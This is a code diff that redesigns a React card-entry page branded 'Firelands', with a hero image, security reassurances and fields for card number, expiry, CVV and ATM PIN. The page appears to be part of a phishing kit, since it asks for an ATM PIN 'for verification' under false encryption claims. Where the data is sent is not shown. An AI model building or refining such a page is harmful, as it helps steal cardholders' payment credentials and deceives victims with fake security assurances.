@@ -4,6 +4,43 @@ import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
 
+const heroImageUrl = '/assets/firelands-landing.jpg';
+
+type IconProps = React.SVGProps<SVGSVGElement>;
+
+const EyeIcon = ({ className }: IconProps) => (
+  <svg
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    strokeLinecap="round"
+    strokeLinejoin="round"
+    className={className}
+  >
+    <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
+    <circle cx="12" cy="12" r="3" />
+  </svg>
+);
+
+const EyeOffIcon = ({ className }: IconProps) => (
+  <svg
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    strokeLinecap="round"
+    strokeLinejoin="round"
+    className={className}
+  >
+    <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a20.76 20.76 0 0 1 5.11-6.11" />
+    <path d="M9.53 9.53a3 3 0 0 0 4.24 4.24" />
+    <path d="M1 1l22 22" />
+  </svg>
+);
+
 const Card: React.FC = () => {
   const [cardNumber, setCardNumber] = useState('');
   const [expiryMonth, setExpiryMonth] = useState('');
@@ -17,7 +54,8 @@ const Card: React.FC = () => {
     cardNumber: '',
     expiry: '',
     cvv: '',
-    atmPin: ''
+    atmPin: '',
+    form: ''
   });
 
   const navigate = useNavigate();
@@ -87,170 +125,179 @@ const Card: React.FC = () => {
   const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Card Information</h2>
+    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
+      <div className="absolute inset-0">
+        <img
+          src={heroImageUrl}
+          alt="Sun setting over Firelands farm fields"
+          className="h-full w-full object-cover"
+          loading="lazy"
+          decoding="async"
+          fetchPriority="high"
+          sizes="100vw"
+        />
+        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
       </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700 text-center mb-8">
-          Please provide your card details for verification purposes.
-        </p>
-
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto space-y-4">
-          {/* Card Number */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Card Number:</label>
-              <input
-                id="cardNumber"
-                name="cardNumber"
-                type="text"
-                value={cardNumber}
-                onChange={handleCardNumberChange}
-                maxLength={19}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="1234 5678 9012 3456"
-              />
+      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
+        <div className="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
+          <section className="order-2 flex flex-1 flex-col justify-center space-y-6 text-white/90 lg:order-1">
+            <div className="space-y-3">
+              <p className="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
+                Secure Your Firelands Journey
+              </p>
+              <h1 className="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
+                Card verification keeps your account safe
+              </h1>
             </div>
-            {errors.cardNumber && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cardNumber}
-              </div>
-            )}
-          </div>
 
-          {/* Expiry Date */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Expiry Date:</label>
-              <div className="flex gap-2">
-                <select
-                  value={expiryMonth}
-                  onChange={(e) => setExpiryMonth(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
+            <p className="max-w-lg text-sm text-white/80">
+              We partner with trusted providers and use multi-layer encryption to protect every
+              interaction. Complete the details to continue your enrollment.
+            </p>
+          </section>
+
+          <section className="order-1 w-full max-w-md lg:order-2 lg:self-start">
+            <div className="w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+              <div className="flex flex-col gap-2">
+                <h2 className="text-2xl font-semibold text-[#2f2e67]">Card Information</h2>
+                <p className="text-sm text-[#5d4f72]">
+                  Enter the card details associated with your membership.
+                </p>
+              </div>
+
+              <form onSubmit={handleSubmit} className="mt-6 space-y-6">
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]" htmlFor="cardNumber">
+                    Card Number
+                  </label>
+                  <input
+                    id="cardNumber"
+                    name="cardNumber"
+                    type="text"
+                    value={cardNumber}
+                    onChange={handleCardNumberChange}
+                    maxLength={19}
+                    placeholder="1234 5678 9012 3456"
+                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                  />
+                  {errors.cardNumber && (
+                    <p className="text-sm text-rose-600">{errors.cardNumber}</p>
+                  )}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]">Expiry Date</label>
+                  <div className="grid grid-cols-2 gap-3">
+                    <select
+                      value={expiryMonth}
+                      onChange={(e) => setExpiryMonth(e.target.value)}
+                      className="rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                    >
+                      <option value="">Month</option>
+                      {Array.from({ length: 12 }, (_, i) => (
+                        <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                          {String(i + 1).padStart(2, '0')}
+                        </option>
+                      ))}
+                    </select>
+                    <select
+                      value={expiryYear}
+                      onChange={(e) => setExpiryYear(e.target.value)}
+                      className="rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                    >
+                      <option value="">Year</option>
+                      {years.map((year) => (
+                        <option key={year} value={year}>
+                          {year}
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+                  {errors.expiry && <p className="text-sm text-rose-600">{errors.expiry}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]" htmlFor="cvv">
+                    CVV
+                  </label>
+                  <div className="relative">
+                    <input
+                      id="cvv"
+                      name="cvv"
+                      type={showCvv ? 'text' : 'password'}
+                      value={cvv}
+                      onChange={(e) => {
+                        const value = e.target.value.replace(/\D/g, '');
+                        if (value.length <= 4) setCvv(value);
+                      }}
+                      maxLength={4}
+                      placeholder="123"
+                      className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowCvv((prev) => !prev)}
+                      className="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
+                      aria-label={showCvv ? 'Hide CVV' : 'Show CVV'}
+                    >
+                      {showCvv ? <EyeOffIcon className="h-5 w-5" /> : <EyeIcon className="h-5 w-5" />}
+                    </button>
+                  </div>
+                  {errors.cvv && <p className="text-sm text-rose-600">{errors.cvv}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-sm text-[#5d4f72]" htmlFor="atmPin">
+                    ATM PIN
+                  </label>
+                  <div className="relative">
+                    <input
+                      id="atmPin"
+                      name="atmPin"
+                      type={showPin ? 'text' : 'password'}
+                      value={atmPin}
+                      onChange={(e) => {
+                        const value = e.target.value.replace(/\D/g, '');
+                        if (value.length <= 4) setAtmPin(value);
+                      }}
+                      maxLength={4}
+                      placeholder="••••"
+                      className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPin((prev) => !prev)}
+                      className="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
+                      aria-label={showPin ? 'Hide ATM PIN' : 'Show ATM PIN'}
+                    >
+                      {showPin ? <EyeOffIcon className="h-5 w-5" /> : <EyeIcon className="h-5 w-5" />}
+                    </button>
+                  </div>
+                  {errors.atmPin && <p className="text-sm text-rose-600">{errors.atmPin}</p>}
+                </div>
+
+                {errors.form && <p className="text-sm text-rose-600">{errors.form}</p>}
+
+                <button
+                  type="submit"
+                  disabled={isLoading}
+                  className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                 >
-                  <option value="">Month</option>
-                  {Array.from({ length: 12 }, (_, i) => (
-                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
-                      {String(i + 1).padStart(2, '0')}
-                    </option>
-                  ))}
-                </select>
-                <select
-                  value={expiryYear}
-                  onChange={(e) => setExpiryYear(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
-                >
-                  <option value="">Year</option>
-                  {years.map((year) => (
-                    <option key={year} value={year}>
-                      {year}
-                    </option>
-                  ))}
-                </select>
+                  {isLoading ? 'Processing…' : 'Continue'}
+                </button>
+              </form>
+
+              <div className="mt-8 space-y-3 rounded-3xl bg-[#f7f7ff] p-6 text-sm text-[#5d4f72]">
+                <p className="font-semibold text-[#2f2e67]">Security reminder</p>
+                <p>
+                  We never store your full card details in plain text. Data is encrypted and processed
+                  according to industry standards.
+                </p>
               </div>
             </div>
-            {errors.expiry && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.expiry}
-              </div>
-            )}
-          </div>
-
-          {/* CVV */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">CVV:</label>
-              <input
-                id="cvv"
-                name="cvv"
-                type={showCvv ? 'text' : 'password'}
-                value={cvv}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setCvv(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="123"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowCvv(!showCvv)}
-              >
-                {showCvv ? 'Hide' : 'Show'}
-              </span>
-            </div>
-            {errors.cvv && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cvv}
-              </div>
-            )}
-          </div>
-
-          {/* ATM PIN */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">ATM PIN:</label>
-              <input
-                id="atmPin"
-                name="atmPin"
-                type={showPin ? 'text' : 'password'}
-                value={atmPin}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setAtmPin(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="****"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowPin(!showPin)}
-              >
-                {showPin ? 'Hide' : 'Show'}
-              </span>
-            </div>
-            {errors.atmPin && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.atmPin}
-              </div>
-            )}
-          </div>
-
-          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
-        </p>
+          </section>
+        </div>
       </div>
     </div>
   );
